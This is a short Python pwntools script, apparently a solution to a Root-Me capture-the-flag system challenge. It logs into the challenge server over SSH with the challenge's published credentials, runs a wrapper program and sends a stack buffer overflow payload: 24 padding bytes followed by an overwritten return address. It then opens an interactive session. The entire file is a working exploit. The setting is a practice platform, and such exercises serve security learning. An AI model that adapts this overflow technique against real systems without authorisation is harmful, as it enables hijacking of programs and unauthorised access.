from pwn import *

#context.binary = ELF('./ch13')
context.log_level = 'debug'

#p = remote(host='challenge02.root-me.org',user='app-systeme-ch13',password='app-systeme-ch13',port=2222)

s = ssh(host='challenge05.root-me.org',user='app-systeme-ch72',password='app-systeme-ch72',port=2225, cwd='.')
p = s.process(executable='./wrapper.sh')


offset = 24
target = 0x0401000
payload = b'A' * offset + p32(target)

p.send(payload)

p.interactive()
